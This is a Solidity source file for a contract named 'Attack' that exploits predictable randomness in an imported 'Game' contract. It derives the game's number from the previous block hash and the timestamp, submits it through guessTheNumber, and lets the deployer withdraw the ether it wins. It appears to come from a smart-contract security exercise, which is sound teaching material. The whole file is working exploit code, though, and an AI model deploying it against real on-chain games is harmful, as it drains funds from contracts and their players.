// SPDX-License-Identifier:MIT
pragma solidity ^0.8.9;

import "./Game.sol";    

contract Attack {
    address payable private admin;
    Game public game;
    
    receive() external payable{
    }

    constructor(address _gameAddress){
        game = Game(_gameAddress);
        admin = payable(msg.sender);
    }

    function getEther() public{
        require(msg.sender == admin,'Only admin can withdraw');
        admin.transfer(address(this).balance);
    }

    function attack() public{
        uint guess = uint(keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp)));
        game.guessTheNumber(guess);
    }
    
}